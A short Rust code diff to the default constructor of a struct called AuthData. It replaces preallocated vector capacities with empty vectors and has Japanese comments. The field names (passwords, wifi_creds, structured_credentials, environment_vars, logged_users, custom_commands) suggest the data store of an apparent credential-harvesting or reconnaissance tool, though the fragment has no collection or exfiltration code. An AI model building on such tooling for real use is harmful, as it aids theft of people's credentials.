@@ -185,21 +185,21 @@ impl Default for AuthData {
                 .duration_since(SystemTime::UNIX_EPOCH)
                 .unwrap_or(Duration::from_secs(0))
                 .as_secs(),
-            passwords: Vec::with_capacity(128), // 典型的な認証情報数を想定
-            wifi_creds: Vec::with_capacity(32), // WiFiプロファイル数を想定
-            structured_wifi: Vec::with_capacity(32), // WiFi構造化データ
-            structured_network: Vec::with_capacity(16), // ネットワークインターフェース数
-            structured_credentials: Vec::with_capacity(64), // 構造化認証情報
+            passwords: Vec::new(), // 動的拡張対応
+            wifi_creds: Vec::new(), // 動的拡張対応
+            structured_wifi: Vec::new(), // 動的拡張対応
+            structured_network: Vec::new(), // 動的拡張対応
+            structured_credentials: Vec::new(), // 動的拡張対応
             metadata: BTreeMap::new(),
             detailed_system: DetailedSystemInfo::default(),
             cpu_info: CpuInfo::default(),
             memory_info: MemoryInfo::default(),
-            storage_info: Vec::with_capacity(8), // ストレージデバイス数
-            process_list: Vec::with_capacity(200), // 典型的なプロセス数
-            network_details: Vec::with_capacity(16), // ネットワーク詳細情報
+            storage_info: Vec::new(), // 動的拡張対応
+            process_list: Vec::new(), // 動的拡張対応
+            network_details: Vec::new(), // 動的拡張対応
             runtime_info: RuntimeInfo::default(),
             environment_vars: BTreeMap::new(),
-            logged_users: Vec::with_capacity(8), // ログインユーザー数
+            logged_users: Vec::new(), // 動的拡張対応
             custom_commands: BTreeMap::new(),
         }
     }
